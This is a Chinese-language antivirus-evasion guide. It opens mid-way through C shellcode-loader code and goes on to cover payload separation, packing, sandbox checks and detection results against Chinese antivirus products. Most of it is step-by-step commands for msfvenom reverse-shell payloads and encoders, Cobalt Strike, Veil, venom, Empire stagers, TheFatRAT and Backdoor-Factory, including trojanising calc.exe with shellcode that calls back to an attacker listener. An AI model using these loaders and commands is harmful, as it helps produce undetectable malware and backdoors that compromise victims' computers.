    memcpy(lpvAddr, raw_buf, sizeof(raw_buf));
    DWORD pa = 0x01;
	LPVOID mVirtualProtect = (LPVOID)GetApi("kernel32.dll", "VirtualProtect");
    mVirtualProtect(lpvAddr, sizeof(raw_buf), PAGE_EXECUTE_READWRITE, &pa);//PAGE_EXECUTE
    if (lpvAddr != NULL) {
        HANDLE s;
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }
}
```



#### 1.3 分离免杀

截止目前，分离免杀被认为是一种较为先进且免杀效果较好的一种免杀方案。分离免杀是一种思想，将可替换的具有恶意特征的一部分代码从程序中分离出来。这样当杀毒软件单独查杀时就无法检测到文件中的特征了。

其基本结构如下：

```cmd
    FILE* fp = fopen("enc.txt", "rb");
......
    while ((ch = fgetc(fp)) != EOF)
    {
        ......
        raw_buf[i] = (unsigned char)ch;
        i++;
    }
......
	d3obfu3c4t0r(raw_buf, i+1);
    cr34te_thr34d_3(raw_buf);
```



#### 1.4 加壳免杀

所谓加壳软件，就是重新写PE文件头信息，并将PE文件进行资源压缩和代码加密。加壳后的文件在运行时，先执行加壳软件进行PE文件的还原工作，有的加壳软件先将PE文件全部在内存中还原后，再运行被还原的文件，还有的是还原一部分，运行一部分。

https://blog.csdn.net/dohxxx/article/details/88786309

https://bbs.pediy.com/thread-206804.htm

https://bbs.pediy.com/thread-206873.htm

一个相对成熟的免杀程序，加密壳可以说是必须的。它有多方面好处：

1.通用性更广。通用于有无源码免杀。通用于staging与stageless。

2.极大增加了后期分析时的难度。影响后期反制溯源流程。

3.免杀失效后快速产生工具。

4.增加了伸手党窃取成果的难度。



#### 1.5 脏语句

在不少关键操作前后添加一些无意义的脏语句，从而影响编译后的程序结构，破坏可能存在的静态特征。

诸如：

1.空的IO类函数调用；

2.数值、字符串拷贝；

3.计算、循环

4.内联汇编写花指令

### 2 反行为检测

反行为检测在具体实现中使用了不少虚拟容器判断的技术。

最常见的技术思想是，只要发现当前程序处于沙箱中就不运行。除此之外还有一些较为冷门的方案，如程序在某些固定的时间才会执行恶意逻辑。



目前收集到以下技术，常被用于绕过沙箱行为检测：

| 描述         | API(C)                                      |
| ------------ | ------------------------------------------- |
| 鼠标坐标     | GetCursorPos                                |
| 开机时长     | GetTickCount                                |
| 检测内存大小 | GlobalMemoryStatusEx                        |
| 检测CPU核数  | ((SYSTEM_INFO)sysinfo).dwNumberOfProcessors |
| 鼠标点击事件 | ReadConsoleInput                            |
| 网络连通性   | -                                           |
| 判断文件名   | -                                           |
| 条件时间运行 | GetSystemTime && if                         |
| 重启才运行   | GetSystemTime && if                         |

### 3 免杀效果

| 描述            | 反行为                                 | 火绒(静态) | 火绒(运行时) | 360杀毒(静态) | 360杀毒(运行时) | 360卫士(静态) | 360卫士(运行时) | 腾讯管家(静态) | 腾讯管家(运行时) |
| --------------- | -------------------------------------- | ---------- | ------------ | ------------- | --------------- | ------------- | --------------- | -------------- | ---------------- |
| staging(msf)    | GetCursorPos                           | ×          | √            | ×             | ×               | ×             | ×               | ×              | ×                |
| staging(msf)    | GetCursorPos                           | ×          | ×            | ×             | ×               | ×             | ×               | ×              | ×                |
| 分离免杀(msf)   | GetCursorPos                           | ×          | √            | ×             | ×               | ×             | ×               | ×              | ×                |
| 分离免杀(msf)   | GetCursorPos                           | ×          | ×            | ×             | ×               | ×             | ×               | ×              | ×                |
| staging(cs3.14) | GetCursorPos                           | ×          | ×            | ×             | ×               | ×             | ×               | ×              | ×                |
| staging(cs4)    | GetCursorPos                           | ×          | ×            | ×             | ×               | ×             | ×               | ×              | ×                |
| staging(msf)    | GetTickCount                           | √          | √            | ×             | ×               | ×             | ×               | ×              | ×                |
| staging(msf)    | GlobalMemoryStatusEx     GetSystemInfo | ×          | ×            | ×             | ×               | ×             | ×               | ×              | ×                |

## 0x03 部分工具使用方法

### 1 Msfvenom

```shell
基本选项：
	-l, --list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
	-a, --arch < architecture> 指定payload的目标架构
	-p, --platform < platform> 指定payload的目标平台
	-s, --space < length> 设定有效攻击荷载的最大长度
	-n, --nopsled < length> 为payload预先指定一个NOP滑动长度
	-b, --bad-chars < list> 设定规避字符集，比如: '\x00'、‘\xff'
	-e, --encoder [encoder] 指定需要使用的encoder（编码器）
	-i, --iterations < count> 指定payload的编码次数
	-x, --template < path> 指定一个自定义的可执行文件作为模板
	-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行
	
	-c, --add-code < path> 指定一个附加的win32 shellcode文件
	-h, --help 查看帮助选项
	--help-formats 查看msf支持的输出格式列表
	-f, --format < format> 指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
	--payload-options 列举payload的标准选项

```



```shell
msfconsole -x "use exploit/multi/handler;\set PAYLOAD windows/meterpreter/reverse_tcp;\set LHOST ${c2_ip};\set LPORT $c2_port;\exploit"

#裸马生成
msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=${c2_ip} LPORT=${c2_port} -o shell.exe

#单次编码
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=${c2_ip} LPORT=${c2_port} -i 3 -e x86/shikata_ga_nai -f exe -o shell.exe

#多次编码-1
msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=${c2_ip} LPORT=${c2_port} -e x86/shikata_ga_nai -i 5 |msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw |msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -b '\x00' -o payload.exe
#多次编码-2
msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -b '\x00' -f exe -o cmd.exe

#文件捆绑
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -x calc.exe -k -f exe -o shell.exe
```

### 2 CobaltStrike

```shell
#传一份cs到linux
chmod +x teamserver;
./teamserver <host> <password> [/path/to/c2.profile] [YYYY-MM-DD]

#本地登录到teamserver后，先配置listener:
ColbaltStrike>Listeners>Add ===> cs4有8种listener 及 cs3.x有9种listener
#再生成木马
Attacks>Packages>Windows Execuation=>2种exe2种dll

```

```cmd
#木马生成(CobaltStrike-Attacks)
### 可执行文件
Attacks>Packages>Windows Executable
./teamserver 192.168.44.128 bloodhound
### HTML程序
Attacks>Packages>HTML Application
### Office宏
Attacks>Packages>Micosoft Office Macro
### Payload Generator
Attacks>Packages>Payload Generator
### 简易恶意网站（常用于无文件攻击），powershell/bitsadmin/regsvr32/python
Attacks>Web Drive-by>Scripted Web Delivery
### 鱼叉式网络Spear Phish

```

### 3 veil

```shell
curl -sSL https://get.daocloud.io/docker | sh
nano /etc/docker/daemon.json
>>>
{
 "registry-mirrors": [
 "https://1nj0zren.mirror.aliyuncs.com",
 "https://docker.mirrors.ustc.edu.cn",
 "http://f1361db2.m.daocloud.io",
 "https://registry.docker-cn.com"
 ]
}
<<<EOF
systemctl daemon-reload
systemctl restart docker
docker pull mattiasohlsson/veil

docker run -it -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil
(dk exec -it 4ae72dc914c9 /bin/bash)

```

veil内部分为Evasion(躲避载具)、Ordnance（核心payload）两部分。语法非常简单，基本是这样的步骤：

+ 使用use选定

+ 使用list查看

+ 使用set设置

+ 使用genrate生成

虽然语法简单但veil的灵活性极强，除了支持内置的6种payload外还支持外部导入的shellcode。

**3.1 Evasion**

虽然看上去有41种躲避载具，但这些载具实质上主要包含两大部分一部分提供meterpreter接口源码一部分提供veil自己内置的shellcode，然后使用c/python/go/lua/perl等多种语言进行加载。

```shell
Veil/Evasion>: list
        1)      autoit/shellcode_inject/flat.py

        2)      auxiliary/coldwar_wrapper.py
        3)      auxiliary/macro_converter.py
        4)      auxiliary/pyinstaller_wrapper.py

        5)      c/meterpreter/rev_http.py
        6)      c/meterpreter/rev_http_service.py
        7)      c/meterpreter/rev_tcp.py
        8)      c/meterpreter/rev_tcp_service.py

        9)      cs/meterpreter/rev_http.py
        10)     cs/meterpreter/rev_https.py
        11)     cs/meterpreter/rev_tcp.py
        12)     cs/shellcode_inject/base64.py
        13)     cs/shellcode_inject/virtual.py

        14)     go/meterpreter/rev_http.py
        15)     go/meterpreter/rev_https.py
        16)     go/meterpreter/rev_tcp.py
        17)     go/shellcode_inject/virtual.py

        18)     lua/shellcode_inject/flat.py

        19)     perl/shellcode_inject/flat.py

        20)     powershell/meterpreter/rev_http.py
        21)     powershell/meterpreter/rev_https.py
        22)     powershell/meterpreter/rev_tcp.py
        23)     powershell/shellcode_inject/psexec_virtual.py
        24)     powershell/shellcode_inject/virtual.py

        25)     python/meterpreter/bind_tcp.py
        26)     python/meterpreter/rev_http.py
        27)     python/meterpreter/rev_https.py
        28)     python/meterpreter/rev_tcp.py
        29)     python/shellcode_inject/aes_encrypt.py
        30)     python/shellcode_inject/arc_encrypt.py
        31)     python/shellcode_inject/base64_substitution.py
        32)     python/shellcode_inject/des_encrypt.py
        33)     python/shellcode_inject/flat.py
        34)     python/shellcode_inject/letter_substitution.py
        35)     python/shellcode_inject/pidinject.py
        36)     python/shellcode_inject/stallion.py

        37)     ruby/meterpreter/rev_http.py
        38)     ruby/meterpreter/rev_https.py
        39)     ruby/meterpreter/rev_tcp.py
        40)     ruby/shellcode_inject/base64.py
        41)     ruby/shellcode_inject/flat.py


```

**3.2 Ordnance**

**3.2.1 payload**

veil内置6种原生的payload

-------------------------------------------------------------------------------

```shell
Veil/Ordnance>: list payloads
    1)      bind_tcp          => Bind TCP Stager (Stage 1)
    2)      rev_http          => Reverse HTTP Stager (Stage 1)
    3)      rev_https         => Reverse HTTPS Stager (Stage 1)
    4)      rev_tcp           => Reverse TCP Stager (Stage 1)
    5)      rev_tcp_all_ports => Reverse TCP All Ports Stager (Stage 1)
    6)      rev_tcp_dns       => Reverse TCP DNS Stager (Stage 1)

```

**3.2.2 encoder**

veil使用xor编码器对shellcode进行转换

### 4 venom

```shell
#安装
git clone https://github.com/r00t-3xp10it/venom.git
cd venom/aux && ./setup.sh; cd ..
./venom.sh

```

```shell
[➽] Chose Categorie number:2 - Windows-OS payloads
AGENT Nº1:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C (uuid obfuscation)
    AGENT EXTENSION    : DLL|CPL
    AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
    DETECTION RATIO    : http://goo.gl/NkVLzj

    AGENT Nº2:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : DLL
    AGENT EXTENSION    : DLL|CPL
    AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
    DETECTION RATIO    : http://goo.gl/dBGd4x

    AGENT Nº3:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C
    AGENT EXTENSION    : PY(pyherion|NXcrypt)|EXE
    AGENT EXECUTION    : python agent.py | press to exec (exe)
    DETECTION RATIO    : https://goo.gl/7rSEyA (.py)
    DETECTION RATIO    : https://goo.gl/WJ9HbD (.exe)

    AGENT Nº4:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : press to exec (exe)
    DETECTION RATIO    : https://goo.gl/WpgWCa

    AGENT Nº5:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : press to exec (exe)
    DETECTION RATIO    : https://goo.gl/MZnQKs

    AGENT Nº6:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C
    AGENT EXTENSION    : RB
    AGENT EXECUTION    : ruby agent.rb
    DETECTION RATIO    : https://goo.gl/eZkoTP

    AGENT Nº7:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : MSI-NOUAC
    AGENT EXTENSION    : MSI
    AGENT EXECUTION    : msiexec /quiet /qn /i agent.msi
    DETECTION RATIO    : https://goo.gl/zcA4xu

    AGENT Nº8:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : POWERSHELL
    AGENT EXTENSION    : BAT
    AGENT EXECUTION    : press to exec (bat)
    DETECTION RATIO    : https://goo.gl/BYCUhb

    AGENT Nº9:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : HTA-PSH
    AGENT EXTENSION    : HTA
    AGENT EXECUTION    : http://192.168.44.128
    DETECTION RATIO    : https://goo.gl/mHC72C

    AGENT Nº10:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD
    AGENT EXTENSION    : PS1 + BAT
    AGENT EXECUTION    : press to exec (bat)
    DETECTION RATIO    : https://goo.gl/GJHu7o

    AGENT Nº11:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD
    AGENT EXTENSION    : BAT
    AGENT EXECUTION    : press to exec (bat)
    DETECTION RATIO    : https://goo.gl/nY2THB

    AGENT Nº12:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : VBS
    AGENT EXTENSION    : VBS
    AGENT EXECUTION    : press to exec (vbs)
    DETECTION RATIO    : https://goo.gl/PDL4qF

    AGENT Nº13:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD
    AGENT EXTENSION    : VBS
    AGENT EXECUTION    : press to exec (vbs)
    DETECTION RATIO    : https://goo.gl/sd3867

    AGENT Nº14:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD|C
    AGENT EXTENSION    : PDF
    AGENT EXECUTION    : press to exec (pdf)
    DETECTION RATIO    : https://goo.gl/N1VTPu

    AGENT Nº15:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : EXE-SERVICE
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : sc start agent.exe
    DETECTION RATIO    : https://goo.gl/dCYdCo

    AGENT Nº16:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C + PYTHON (uuid obfuscation)
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : press to exec (exe)
    DETECTION RATIO    : https://goo.gl/HgnSQW

    AGENT Nº17:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C + AVET (obfuscation)
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : press to exec (exe)
    DETECTION RATIO    : https://goo.gl/kKJuQ5

    AGENT Nº18:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : SHELLTER (trojan embedded)
    AGENT EXTENSION    : EXE
    AGENT EXECUTION    : press to exec (exe)
    DETECTION RATIO    : https://goo.gl/9MtQjM

    AGENT Nº19:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : CSHARP
    AGENT EXTENSION    : XML + BAT
    AGENT EXECUTION    : press to exec (bat)
    DETECTION RATIO    : https://goo.gl/coKiKx

    AGENT Nº20:
    ───────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : PSH-CMD|EXE
    AGENT EXTENSION    : BAT|EXE
    AGENT EXECUTION    : http://192.168.44.128/EasyFileSharing.hta
    DETECTION RATIO    : https://goo.gl/R8UNW3

    AGENT Nº21:
    ───────────
    DESCRIPTION        : ICMP (ping) Reverse Shell
    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
    AGENT EXTENSION    : EXE
    DROPPER EXTENSION  : BAT
    AGENT EXECUTION    : http://192.168.44.128/dropper.bat
    DISCLOSURE BY      : @Daniel Compton (icmpsh.exe)


```

### 5 Empire

```shell
# 配置监听器
(Empire) > uselistener <Tab><Tab>
dbx    http    http_com    http_foreign    http_hop
http_mapi    meterpreter    onedrive    redirector
(Empire: listeners) > uselistener http
(Empire: listeners/http) > info
(Empire: listeners/http) > set Host http://192.168.205.111
(Empire: listeners/http) > set Port 25675
(Empire: listeners/http) > execute
# 生成木马
(Empire: listeners/http) > back
(Empire) > usestager <Tab><Tab>
(Empire) > usestager windows/launcher_bat http
(Empire: stager/windows/launcher_bat) > execute
## 运行完毕后生成bat文件，受害者获得该文件并执行
Invoke-Item C:\users\DELL\launcher.bat
## 除了生成bat文件以外，还可以生成基于脚本语言的一句话，用于无文件攻击
(Empire: listeners) > launcher powershell http
(Empire: listeners) > launcher python http

```

### 6 theFatRAT

```shell
git clone https://github.com/Screetsec/TheFatRat
./update && chmod + x setup.sh && ./setup.sh

proxychains ./fatrat

```

```shell
	[01]  Create Backdoor with msfvenom
	[02]*  Create Fud 100% Backdoor with Fudwin 1.0
	[03]  Create Fud Backdoor with Avoid v1.2  
	[04]  Create Fud Backdoor with backdoor-factory [embed] 
	[05]  Backdooring Original apk [Instagram, Line,etc] 
	[06]*  Create Fud Backdoor 1000% with PwnWinds [Excelent] 
	[07]  Create Backdoor For Office with Microsploit 
	[08]  Trojan Debian Package For Remote Acces [Trodebi] 
	[09]  Load/Create auto listeners  
	[10]  Jump to msfconsole  
	[11]  Searchsploit  
	[12]  File Pumper [Increase Your Files Size] 
	[13]  Configure Default Lhost & Lport 
	[14]  Cleanup  
	[15]  Help  
	[16]  Credits  
	[17]  Exit  


```

2和6是普遍反映做的比较好的两个功能模块。



### 7 Backdoor-Factory

思想：利用PE文件内部大量的00空余空间，打patch填充payload，在不影响程序的正常功能的情况下执行恶意代码。

```shell
git clone https://github.com/secretsquirrel/the-backdoor-factory.git
#kali已预装，但无法识别exe,要执行以下步骤。
pip install capstone

```

+ **[使用] step1**:判断程序是否可以打patch

```shell
[>>>>] ./backdoor.py -f workspace/calc.exe -S
[*] Checking if binary is supported
[*] Gathering file info
[*] Reading win64 entry instructions
workspace/calc.exe is supported.

```

+ **[使用] step2**:分析程序中可用的空余空间
  下面的例子中，calc在data段中有431单位长度的空间，rsrc段中有386单位长度的空间。

```shell
[>>>>] ./backdoor.py -f workspace/calc.exe -c
[*] Checking if binary is supported
[*] Gathering file info
[*] Reading win64 entry instructions
Looking for caves with a size of 380 bytes (measured as an integer
[*] Looking for caves
No section
->Begin Cave 0x1c64
->End of Cave 0x1e08
Size of Cave (int) 420
**************************************************
We have a winner: .data
->Begin Cave 0x1e51
->End of Cave 0x2000
Size of Cave (int) 431
SizeOfRawData 0x200
PointerToRawData 0x1e00
End of Raw Data: 0x2000
**************************************************
We have a winner: .rsrc
->Begin Cave 0x6750
->End of Cave 0x68d2
Size of Cave (int) 386
SizeOfRawData 0x4800
PointerToRawData 0x2200
End of Raw Data: 0x6a00
**************************************************
[*] Total of 3 caves found

```

**[使用] step3**:获得可用的payload

```shell
[>>>>] ./backdoor.py -f workspace/calc.exe -s show
The following WinIntelPE64s are available: (use -s)
   cave_miner_inline
   iat_reverse_tcp_inline
   iat_reverse_tcp_inline_threaded
   iat_reverse_tcp_stager_threaded
   iat_user_supplied_shellcode_threaded
   meterpreter_reverse_https_threaded
   reverse_shell_tcp_inline
   reverse_tcp_stager_threaded
   user_supplied_shellcode_threaded

```

**[使用] step4**:填充并生成

```shell
[>>>>] ./backdoor.py -f workspace/calc.exe -s cave_miner_inline -J -H 192.168.43.128 -P 4444  -o 1.exe
[*] In the backdoor module
[*] Checking if binary is supported
[*] Gathering file info
[*] Reading win64 entry instructions
[*] Looking for and setting selected shellcode
[*] Creating win64 resume execution stub
[*] Looking for caves that will fit the minimum shellcode length of 44
[*] All caves lengths:  44, 44, 55
############################################################
The following caves can be used to inject code and possibly
continue execution.
**Don't like what you see? Use jump, single, append, or ignore.**
############################################################
[*] Cave 1 length as int: 44
[*] Available caves: 
1. Section Name: None; Section Begin: None End: None; Cave begin: 0x2f4 End: 0x3fc; Cave Size: 264
2. Section Name: .text; Section Begin: 0x400 End: 0x1000; Cave begin: 0xf84 End: 0xffc; Cave Size: 120
3. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x1016 End: 0x1064; Cave Size: 78
4. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x10a7 End: 0x1114; Cave Size: 109
5. Section Name: None; Section Begin: None End: None; Cave begin: 0x1c68 End: 0x1e04; Cave Size: 412
7. Section Name: .data; Section Begin: 0x1e00 End: 0x2000; Cave begin: 0x1e55 End: 0x1ffc; Cave Size: 423
8. Section Name: None; Section Begin: None End: None; Cave begin: 0x20e6 End: 0x220a; Cave Size: 292
9. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x302c End: 0x3064; Cave Size: 56
10. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x42ac End: 0x4324; Cave Size: 120
11. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6754 End: 0x68ce; Cave Size: 378
12. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6911 End: 0x69fd; Cave Size: 236
**************************************************
[!] Enter your selection: 11
[!] Using selection: 11
[*] Changing flags for section: .rsrc
[*] Cave 2 length as int: 44
[*] Available caves: 
1. Section Name: None; Section Begin: None End: None; Cave begin: 0x2f4 End: 0x3fc; Cave Size: 264
2. Section Name: .text; Section Begin: 0x400 End: 0x1000; Cave begin: 0xf84 End: 0xffc; Cave Size: 120
3. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x1016 End: 0x1064; Cave Size: 78
4. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x10a7 End: 0x1114; Cave Size: 109
5. Section Name: None; Section Begin: None End: None; Cave begin: 0x1c68 End: 0x1e04; Cave Size: 412
7. Section Name: .data; Section Begin: 0x1e00 End: 0x2000; Cave begin: 0x1e55 End: 0x1ffc; Cave Size: 423
8. Section Name: None; Section Begin: None End: None; Cave begin: 0x20e6 End: 0x220a; Cave Size: 292
9. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x302c End: 0x3064; Cave Size: 56
10. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x42ac End: 0x4324; Cave Size: 120
11. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6754 End: 0x68ce; Cave Size: 378
12. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6911 End: 0x69fd; Cave Size: 236
**************************************************
[!] Enter your selection: 12
[!] Using selection: 12
[*] Changing flags for section: .rsrc
[*] Cave 3 length as int: 55
[*] Available caves: 
1. Section Name: None; Section Begin: None End: None; Cave begin: 0x2f4 End: 0x3fc; Cave Size: 264
2. Section Name: .text; Section Begin: 0x400 End: 0x1000; Cave begin: 0xf84 End: 0xffc; Cave Size: 120
3. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x1016 End: 0x1064; Cave Size: 78
4. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x10a7 End: 0x1114; Cave Size: 109
5. Section Name: None; Section Begin: None End: None; Cave begin: 0x1c68 End: 0x1e04; Cave Size: 412
7. Section Name: .data; Section Begin: 0x1e00 End: 0x2000; Cave begin: 0x1e55 End: 0x1ffc; Cave Size: 423
8. Section Name: None; Section Begin: None End: None; Cave begin: 0x20e6 End: 0x220a; Cave Size: 292
9. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x302c End: 0x3064; Cave Size: 56
10. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x42ac End: 0x4324; Cave Size: 120
11. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6754 End: 0x68ce; Cave Size: 378
12. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6911 End: 0x69fd; Cave Size: 236
**************************************************
[!] Enter your selection: 10
[!] Using selection: 10
[*] Changing flags for section: .rsrc
[*] Patching initial entry instructions
[*] Creating win64 resume execution stub
[*] Looking for and setting selected shellcode
File 1.exe is in the 'backdoored' directory

```



## 0xFF 附录技术文章

基础知识

```shell
[1]免杀技术有一套（免杀方法大集结）-2017-05-22
https://www.freebuf.com/column/135314.html

[2] 远控免杀从入门到实践（1）：基础篇 -2020
https://www.freebuf.com/articles/system/227461.html
https://github.com/TideSec/BypassAntiVirus

[3]免杀艺术 1: 史上最全的免杀方法汇总 2017年
https://blog.csdn.net/weixin_34303897/article/details/90350289?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&spm=1001.2101.3001.4242

[4] 免杀技术常用方法 https://blog.csdn.net/whatday/article/details/105715578

[5] 免杀技术大杂烩---乱拳也打不死老师傅 https://github.com/Airboi/bypass-av-note
```

远控分析

```shell
[1]从剖析cs木马生成到开发免杀工具 https://www.freebuf.com/company-information/242596.html 

[2]meterpreter免杀及对抗分析 https://www.freebuf.com/sectool/157122.html

[3]渗透利器Cobalt Strike - 第2篇 APT级的全面免杀与企业纵深防御体系的对抗 https://xz.aliyun.com/t/4191

[4]浅谈meterpreter免杀 https://www.jianshu.com/p/9d2790f6c8aa

```



加载器

```shell
#shellcode加载
[1]红队基本操作-通用Shellcode加载器： https://www.freebuf.com/articles/system/228795.html

[2]Github项目shellcode_launcher：https://github.com/clinicallyinane/shellcode_launcher/

[3]Windows shellcode执行技术入门指南 https://zhuanlan.zhihu.com/p/82090444?from_voters_page=true

[4]一篇关于shellcode xor编解码的文章：http://blog.chinaunix.net/uid-26275986-id-5037780.html
DLL加载：
rundll32.exe dll_msf.dll,main

```



分离免杀

```shell
[1]分离免杀的实践 https://www.cnblogs.com/nul1/p/12167561.html

[2]侯亮分离免杀 https://micro8.gitbook.io/micro8/contents-1/61-70/66-jie-zhu-aspx-dui-payload-jin-hang-fen-li-mian-sha

```

项目


```shell
#免杀工具列表
git clone https://github.com/Veil-Framework/Veil-Evasion.git
git clone https://github.com/r00t-3xp10it/venom.git
https://www.shellterproject.com/
git clone https://github.com/Screetsec/TheFatRat.git

#壳
github donut（C#，将exe转化位shellcode，通过C#来加载）

```



https://www.cnblogs.com/LyShark/p/13785619.html
《黑客免杀攻防》-2013
《杀不死的密码》--2010-06
https://xz.aliyun.com/t/4191
https://bbs.ichunqiu.com/thread-53045-1-1.html
https://www.cnblogs.com/ssw6/p/12091506.html
https://blog.csdn.net/qq_41874930/article/details/107842074
